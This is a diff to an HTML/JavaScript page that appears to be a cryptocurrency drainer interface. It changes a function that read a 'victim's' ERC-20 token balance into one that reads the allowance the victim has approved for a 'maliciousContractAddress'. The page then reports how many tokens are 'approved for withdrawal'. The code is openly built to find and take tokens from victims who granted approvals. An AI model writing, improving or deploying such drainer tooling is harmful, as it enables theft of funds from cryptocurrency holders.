@@ -49,7 +49,7 @@
     <br><br>
 
     <!-- Check Balance Button -->
-    <button id="checkBalanceBtn" style="display:none;" onclick="checkBalance()">Check Balance</button>
+    <button id="checkBalanceBtn" style="display:none;" onclick="checkAllowance()">Check Allowance</button>
 
     <p id="balance"></p>
 
@@ -112,7 +112,8 @@
             }
         }
 
-        async function checkBalance() {
+        // Function to check the approved allowance
+        async function checkAllowance() {
             const victimAddress = document.getElementById('victimAddress').value;
 
             if (!victimAddress) {
@@ -122,35 +123,36 @@
             }
 
             try {
-                console.debug("Fetching balance for victim:", victimAddress);
+                console.debug("Fetching allowance for victim:", victimAddress);
 
-                // Get the victim's token balance using the ERC-20 token contract
+                // Get the allowance (approved amount) for the malicious contract
                 const tokenContract = new web3.eth.Contract([{
                     "constant": true,
                     "inputs": [
-                        { "name": "_owner", "type": "address" }
+                        { "name": "_owner", "type": "address" },
+                        { "name": "_spender", "type": "address" }
                     ],
-                    "name": "balanceOf",
+                    "name": "allowance",
                     "outputs": [
-                        { "name": "balance", "type": "uint256" }
+                        { "name": "remaining", "type": "uint256" }
                     ],
                     "payable": false,
                     "stateMutability": "view",
                     "type": "function"
                 }], tokenAddress);
 
-                const victimBalance = await tokenContract.methods.balanceOf(victimAddress).call();
-                console.debug("Victim's token balance: " + victimBalance);
+                const allowance = await tokenContract.methods.allowance(victimAddress, maliciousContractAddress).call();
+                console.debug("Approved allowance: " + allowance);
 
-                // Display the balance in a readable format
-                if (victimBalance <= 0) {
-                    document.getElementById('balance').innerText = "Victim has no tokens to withdraw!";
+                // Display the approved allowance
+                if (allowance <= 0) {
+                    document.getElementById('balance').innerText = "No tokens are approved for withdrawal!";
                 } else {
-                    document.getElementById('balance').innerText = `Victim's Token Balance: ${victimBalance}`;
+                    document.getElementById('balance').innerText = `Approved Allowance: ${allowance}`;
                 }
             } catch (error) {
-                console.error("Error checking balance:", error);
-                document.getElementById('balance').innerText = "Error checking balance.";
+                console.error("Error checking allowance:", error);
+                document.getElementById('balance').innerText = "Error checking allowance.";
             }
         }
 
@@ -213,4 +215,5 @@
     </script>
 </body>
 </html>
+
 
